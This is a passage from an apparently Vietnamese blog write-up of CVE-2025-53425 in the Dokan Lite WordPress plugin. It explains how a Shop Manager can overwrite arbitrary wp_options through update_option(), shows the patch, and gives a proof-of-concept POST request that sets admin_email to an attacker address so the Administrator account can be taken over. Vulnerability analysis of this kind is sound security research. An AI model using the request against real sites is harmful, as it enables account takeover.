&lt;code&gt;create_roles()&lt;/code&gt; ƒë·ªÉ g√°n cho c√°c vai tr√≤ ng∆∞·ªùi d√πng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function create_roles() {&#xA;    ...&#xA;    // Shop manager role.&#xA;    add_role(&#xA;        &amp;#39;shop_manager&amp;#39;,&#xA;        &amp;#39;Shop manager&amp;#39;,&#xA;        array(&#xA;            &amp;#39;level_9&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_8&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_7&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_6&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_5&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_4&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_3&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_2&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_1&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_0&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;read&amp;#39;                   =&amp;gt; true,&#xA;            &amp;#39;read_private_pages&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;read_private_posts&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_posts&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_pages&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_published_posts&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;edit_published_pages&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;edit_private_pages&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_private_posts&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_others_posts&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;edit_others_pages&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;publish_posts&amp;#39;          =&amp;gt; true,&#xA;            &amp;#39;publish_pages&amp;#39;          =&amp;gt; true,&#xA;            &amp;#39;delete_posts&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;delete_pages&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;delete_private_pages&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;delete_private_posts&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;delete_published_pages&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;delete_published_posts&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;delete_others_posts&amp;#39;    =&amp;gt; true,&#xA;            &amp;#39;delete_others_pages&amp;#39;    =&amp;gt; true,&#xA;            &amp;#39;manage_categories&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;manage_links&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;moderate_comments&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;upload_files&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;export&amp;#39;                 =&amp;gt; true,&#xA;            &amp;#39;import&amp;#39;                 =&amp;gt; true,&#xA;            &amp;#39;list_users&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_theme_options&amp;#39;     =&amp;gt; true,&#xA;        )&#xA;    );&#xA;&#xA;    $capabilities = self::get_core_capabilities();&#xA;&#xA;    foreach ( $capabilities as $cap_group ) {&#xA;        foreach ( $cap_group as $cap ) {&#xA;            $wp_roles-&amp;gt;add_cap( &amp;#39;shop_manager&amp;#39;, $cap );&#xA;            $wp_roles-&amp;gt;add_cap( &amp;#39;administrator&amp;#39;, $cap );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y t·∫°o v√† c·∫•u h√¨nh c√°c vai tr√≤ ng∆∞·ªùi d√πng, trong ƒë√≥ &lt;strong&gt;role &lt;code&gt;shop_manager&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c c·∫•p r·∫•t nhi·ªÅu quy·ªÅn cao, g·∫ßn t∆∞∆°ng ƒë∆∞∆°ng v·ªõi &lt;strong&gt;administrator&lt;/strong&gt;, bao g·ªìm:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Qu·∫£n l√Ω b√†i vi·∫øt, trang v√† b√¨nh lu·∫≠n&lt;/li&gt;&#xA;&lt;li&gt;Upload file, import/export&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;edit_theme_options&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau ƒë√≥, &lt;strong&gt;to√†n b·ªô quy·ªÅn WooCommerce&lt;/strong&gt; ƒë∆∞·ª£c khai b√°o trong &lt;code&gt;get_core_capabilities()&lt;/code&gt; ti·∫øp t·ª•c ƒë∆∞·ª£c g√°n th√™m cho:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;shop_manager&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;administrator&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$wp_roles-&amp;gt;add_cap( &amp;#39;shop_manager&amp;#39;, $cap );&#xA;$wp_roles-&amp;gt;add_cap( &amp;#39;administrator&amp;#39;, $cap );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y ƒë·ªìng nghƒ©a v·ªõi vi·ªác &lt;strong&gt;Shop Manager c√≥ quy·ªÅn &lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ v·∫≠y, ƒë·ªÉ h√†m &lt;code&gt;save_settings_value()&lt;/code&gt; ti·∫øp t·ª•c x·ª≠ l√Ω th√¨ user ph·∫£i c√≥ role &lt;code&gt;Shop manager&lt;/code&gt;, ta c√≥ th·ªÉ t·∫°o user v·ªõi quy·ªÅn n√†y trong Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/create.png&#34; title=&#34;Create Shop Manager User&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/create.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Shop Manager User&lt;/h2&gt;&lt;p&gt;Create Shop Manager User&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/create.png&#39; alt=&#34;Create Shop Manager User&#34; height=&#34;555&#34; width=&#34;1195&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create Shop Manager User&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒê√∫ng nh∆∞ t√™n g·ªçi c·ªßa h√†m &lt;code&gt;save_settings_value()&lt;/code&gt;, ch·ª©c nƒÉng c·ªßa n√≥ l√† l∆∞u c√°c thi·∫øt l·∫≠p (settings) c·ªßa Dokan.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/setting.png&#34; title=&#34;Setting c·ªßa Dokan trong UI&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/setting.png&#34; data-sub-html=&#34;&lt;h2&gt;Setting&lt;/h2&gt;&lt;p&gt;Setting c·ªßa Dokan trong UI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/setting.png&#39; alt=&#34;Setting&#34; height=&#34;913&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Setting c·ªßa Dokan trong UI&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;T·∫≠n d·ª•ng s·ª©c m·∫°nh c·ªßa &lt;strong&gt;debugger&lt;/strong&gt;, ta ƒë·∫∑t &lt;strong&gt;breakpoint&lt;/strong&gt; t·∫°i h√†m &lt;code&gt;save_settings_value()&lt;/code&gt; v√† th·ª±c hi·ªán thao t√°c &lt;strong&gt;l∆∞u settings&lt;/strong&gt; t·ª´ giao di·ªán qu·∫£n tr·ªã.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu debugger ho·∫°t ƒë·ªông ƒë√∫ng, &lt;strong&gt;lu·ªìng th·ª±c thi s·∫Ω d·ª´ng l·∫°i ngay t·∫°i breakpoint&lt;/strong&gt;, x√°c nh·∫≠n r·∫±ng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Request l∆∞u settings th·ª±c s·ª± ƒëi v√†o h√†m &lt;code&gt;save_settings_value()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Ng∆∞·ªùi d√πng hi·ªán t·∫°i ƒë√£ &lt;strong&gt;v∆∞·ª£t qua ki·ªÉm tra quy·ªÅn &lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Nonce &lt;code&gt;dokan_admin&lt;/code&gt; l√† &lt;strong&gt;h·ª£p l·ªá&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/debug.png&#34; title=&#34;Debugger ho·∫°t ƒë·ªông&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/debug.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger ho·∫°t ƒë·ªông&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/debug.png&#39; alt=&#34;Debug&#34; height=&#34;637&#34; width=&#34;1904&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger ho·∫°t ƒë·ªông&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; ƒêi·ªÅu n√†y cho th·∫•y ch·ª©c nƒÉng l∆∞u settings th·ª±c s·ª± c√≥ th·ªÉ ƒë∆∞·ª£c th·ª±c thi th√†nh c√¥ng, v√† lu·ªìng x·ª≠ l√Ω ho·∫°t ƒë·ªông ƒë√∫ng nh∆∞ ph√¢n t√≠ch ·ªü tr√™n.&lt;/p&gt;&#xA;&lt;p&gt;ƒê√¢y l√† ƒëi·ªÉm m√°u ch·ªët khi·∫øn l√µ h·ªïng x·∫£y ra:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$option_name  = sanitize_text_field( wp_unslash( $_POST[&amp;#39;section&amp;#39;] ) );&#xA;$option_value = $this-&amp;gt;sanitize_options( wp_unslash( $_POST[&amp;#39;settingsData&amp;#39;] ), &amp;#39;edit&amp;#39; );&#xA;update_option( $option_name, $option_value );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêo·∫°n m√£ tr√™n cho ph√©p &lt;strong&gt;d·ªØ li·ªáu t·ª´ request ƒë∆∞·ª£c ghi tr·ª±c ti·∫øp v√†o &lt;code&gt;wp_options&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Trong ƒë√≥, &lt;strong&gt;ng∆∞·ªùi d√πng c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n &lt;code&gt;$option_name&lt;/code&gt; th√¥ng qua tham s·ªë &lt;code&gt;section&lt;/code&gt;&lt;/strong&gt;. M·∫∑c d√π d·ªØ li·ªáu c√≥ ƒë∆∞·ª£c sanitize, nh∆∞ng &lt;strong&gt;kh√¥ng h·ªÅ c√≥ c∆° ch·∫ø gi·ªõi h·∫°n (whitelist) c√°c option ƒë∆∞·ª£c ph√©p c·∫≠p nh·∫≠t&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Khi k·∫øt h·ª£p v·ªõi vi·ªác &lt;strong&gt;Shop Manager c√≥ quy·ªÅn &lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/strong&gt;, m·ªôt role &lt;strong&gt;kh√¥ng ph·∫£i Administrator&lt;/strong&gt; v·∫´n c√≥ th·ªÉ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ghi ho·∫∑c ghi ƒë√® &lt;strong&gt;b·∫•t k·ª≥ option n√†o&lt;/strong&gt; trong h·ªá th·ªëng&lt;/li&gt;&#xA;&lt;li&gt;Thay ƒë·ªïi &lt;strong&gt;c√°c c·∫•u h√¨nh c√≥ ph·∫°m vi to√†n c·ª•c c·ªßa WordPress/Dokan&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn &lt;strong&gt;Privilege Escalation&lt;/strong&gt;, v√¨ ng∆∞·ªùi d√πng c√≥ quy·ªÅn th·∫•p h∆°n c√≥ th·ªÉ &lt;strong&gt;th·ª±c hi·ªán c√°c h√†nh ƒë·ªông v·ªën ch·ªâ n√™n d√†nh cho Administrator&lt;/strong&gt;, th√¥ng qua vi·ªác thao t√∫ng c√°c option quan tr·ªçng trong database.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;M·ªôt k·ªãch b·∫£n ph·ªï bi·∫øn ƒë·ªÉ khai th√°c l·ªó h·ªïng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; th√¥ng qua h√†m &lt;code&gt;update_option()&lt;/code&gt; l√†:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;ƒê·∫∑t &lt;code&gt;users_can_register = 1&lt;/code&gt; ‚Üí cho ph√©p ng∆∞·ªùi d√πng t·ª± ƒëƒÉng k√Ω&lt;/li&gt;&#xA;&lt;li&gt;ƒê·∫∑t &lt;code&gt;default_role = administrator&lt;/code&gt; ‚Üí ng∆∞·ªùi d√πng m·ªõi ƒë∆∞·ª£c t·∫°o s·∫Ω c√≥ quy·ªÅn Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhi√™n, trong m√¥i tr∆∞·ªùng s·ª≠ d·ª•ng &lt;strong&gt;WooCommerce&lt;/strong&gt; k·∫øt h·ª£p v·ªõi &lt;strong&gt;Dokan&lt;/strong&gt;, lu·ªìng ƒëƒÉng k√Ω ng∆∞·ªùi d√πng &lt;strong&gt;kh√¥ng s·ª≠ d·ª•ng &lt;code&gt;/wp-login.php?action=register&lt;/code&gt; m·∫∑c ƒë·ªãnh c·ªßa WordPress&lt;/strong&gt;, m√† b·∫Øt bu·ªôc th√¥ng qua endpoint &lt;strong&gt;&lt;code&gt;/my-account/&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/register.png&#34; title=&#34;Register&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/register.png&#34; data-sub-html=&#34;&lt;h2&gt;Register&lt;/h2&gt;&lt;p&gt;Register&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/register.png&#39; alt=&#34;Register&#34; height=&#34;1081&#34; width=&#34;1638&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Register&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;C∆° ch·∫ø n√†y ch·ªâ cho ph√©p ng∆∞·ªùi d√πng ƒëƒÉng k√Ω v·ªõi vai tr√≤ &lt;strong&gt;Customer&lt;/strong&gt; ho·∫∑c &lt;strong&gt;Vendor&lt;/strong&gt;, v√¨ v·∫≠y &lt;strong&gt;kh√¥ng th·ªÉ khai th√°c theo k·ªãch b·∫£n thay ƒë·ªïi &lt;code&gt;default_role&lt;/code&gt; nh∆∞ tr√™n&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;M·∫∑c d√π v·∫≠y, k·∫ª t·∫•n c√¥ng v·∫´n c√≥ th·ªÉ khai th√°c theo h∆∞·ªõng kh√°c. C·ª• th·ªÉ, b·∫±ng c√°ch &lt;strong&gt;thay ƒë·ªïi option &lt;code&gt;admin_email&lt;/code&gt;&lt;/strong&gt;, attacker c√≥ th·ªÉ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;G√°n email qu·∫£n tr·ªã v·ªÅ email do m√¨nh ki·ªÉm so√°t&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng ch·ª©c nƒÉng &lt;strong&gt;Forgot Password&lt;/strong&gt; ƒë·ªÉ ƒë·∫∑t l·∫°i m·∫≠t kh·∫©u&lt;/li&gt;&#xA;&lt;li&gt;Chi·∫øm quy·ªÅn truy c·∫≠p t√†i kho·∫£n &lt;strong&gt;Administrator&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;V√≠ d·ª• ki·ªÉm tra trong database:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from wp_options where option_name = &amp;#39;admin_email&amp;#39;;&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;| option_id | option_name | option_value    | autoload |&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;|         7 | admin_email | admin@gmail.com | on       |&#xA;&amp;#43;-----------&amp;#43;-------------&amp;#43;-----------------&amp;#43;----------&amp;#43;&#xA;1 row in set (0.001 sec)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√°ch khai th√°c n√†y v·∫´n d·∫´n ƒë·∫øn &lt;strong&gt;Privilege Escalation&lt;/strong&gt;, d√π kh√¥ng t·∫°o admin tr·ª±c ti·∫øp, m√† th√¥ng qua &lt;strong&gt;chi·∫øm quy·ªÅn t√†i kho·∫£n qu·∫£n tr·ªã hi·ªán c√≥&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&lt;hr&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;strong&gt;v4.1.3&lt;/strong&gt; ƒë√£ b·ªï sung &lt;strong&gt;ki·ªÉm tra v√† gi·ªõi h·∫°n &lt;code&gt;option_name&lt;/code&gt;&lt;/strong&gt;, ch·ªâ cho ph√©p c·∫≠p nh·∫≠t c√°c option &lt;strong&gt;n·∫±m trong danh s√°ch section h·ª£p l·ªá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;// validate and sanitize option name to avoid any unwanted option update&#xA;if ( ! in_array( $option_name, wp_list_pluck( $this-&amp;gt;get_settings_sections(), &amp;#39;id&amp;#39; ), true ) ) {&#xA;    throw new DokanException( &amp;#39;dokan_settings_invalid_section&amp;#39;, __( &amp;#39;Invalid section name.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 400 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nh·ªù ƒë√≥, ng∆∞·ªùi d√πng &lt;strong&gt;kh√¥ng th·ªÉ t√πy √Ω ch·ªâ ƒë·ªãnh option name&lt;/strong&gt;, ngƒÉn ch·∫∑n vi·ªác ghi ƒë√® c√°c option nh·∫°y c·∫£m nh∆∞ &lt;code&gt;admin_email&lt;/code&gt;, v√† &lt;strong&gt;kh·∫Øc ph·ª•c l·ªó h·ªïng Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Shop Manager (Authenticated User)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Click Save Settings (Dokan Admin UI)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;action=dokan_save_settings&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;wp_ajax_dokan_save_settings&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Settings::save_settings_value()&amp;#34;]&#xA;&#xA;F --&amp;gt; G{&amp;#34;current_user_can(&amp;#39;manage_woocommerce&amp;#39;)?&amp;#34;}&#xA;G -- No --&amp;gt; H[&amp;#34;Abort&amp;#34;]&#xA;G -- Yes --&amp;gt; I{&amp;#34;Nonce dokan_admin valid?&amp;#34;}&#xA;&#xA;I -- No --&amp;gt; J[&amp;#34;Abort&amp;#34;]&#xA;I -- Yes --&amp;gt; K[&amp;#34;Read POST parameters&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;section taken as option_name&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;settingsData taken as option_value&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;update_option(option_name, option_value)&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Sensitive wp_options modified&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Change admin_email&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Use Forgot Password&amp;#34;]&#xA;Q --&amp;gt; R[&amp;#34;Take over Administrator account&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy c·∫≠p endpoint &lt;code&gt;http://localhost/wp-admin/admin.php?page=dokan#/settings&lt;/code&gt; v√† click &lt;code&gt;Save Changes&lt;/code&gt; button&lt;/li&gt;&#xA;&lt;li&gt;Cho request ƒëi qua Burp Proxy&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i l·∫°i request v·ªõi params &lt;code&gt;section=admin_email&lt;/code&gt; v√† &lt;code&gt;settingsData=attacker@gmail.com&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: shop_manager_cookie&#xA;&#xA;action=dokan_save_settings&amp;amp;nonce=d7311ec197&amp;amp;settingsData=attacker@gmail.com&amp;amp;section=admin_email&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/result.png&#39; alt=&#34;Result&#34; height=&#34;745&#34; width=&#34;1612&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong &lt;strong&gt;Dokan Lite ‚â§ 4.1.3&lt;/strong&gt; x·∫£y ra do &lt;strong&gt;ki·ªÉm so√°t quy·ªÅn kh√¥ng ch·∫∑t ch·∫Ω&lt;/strong&gt;. Vi·ªác ch·ªâ ki·ªÉm tra &lt;code&gt;manage_woocommerce&lt;/code&gt; cho ph√©p &lt;strong&gt;Shop Manager&lt;/strong&gt; th·ª±c thi ch·ª©c nƒÉng l∆∞u settings v√† ghi ƒë√® &lt;strong&gt;b·∫•t k·ª≥ option n√†o&lt;/strong&gt; th√¥ng qua &lt;code&gt;update_option()&lt;/code&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;Privilege Escalation&lt;/strong&gt; (v√≠ d·ª• chi·∫øm quy·ªÅn Administrator qua &lt;code&gt;admin_email&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 